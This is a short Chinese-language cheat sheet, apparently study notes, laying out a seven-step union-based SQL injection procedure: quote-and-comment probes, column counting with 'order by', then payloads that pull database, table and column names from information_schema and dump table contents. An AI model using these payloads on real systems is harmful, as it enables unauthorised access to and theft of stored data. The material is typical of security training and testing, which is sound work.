# 基础SQL注入流程

### 1.判断是否存在注入

1'         1'#

**输入注释后正常——字符型注入**

**输入注释后不正常——数字型注入**

### 2.查询字段数

**order by n**

### 3.查询哪个字段有回显

```mysql 
union select 1，2，3，4......#
```

### 4.查询数据库名

```my
union select 1,2,database(),4...#
```

### 5.查询表名

```my
union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='需要加单引号'#
```

**查询时可能只回显一位，所以需要用group_concat(table_name)  来集中回显表名**

### 6.查询列名

```mysql
union select 1,column_name,3,4 from information_schema.columns where table_name='表名结果'#
```

**此处同样可以利用group_concat来集中显示**

### 7.查询字段

```my
union select 列名,2,3,4 from 表名#
```

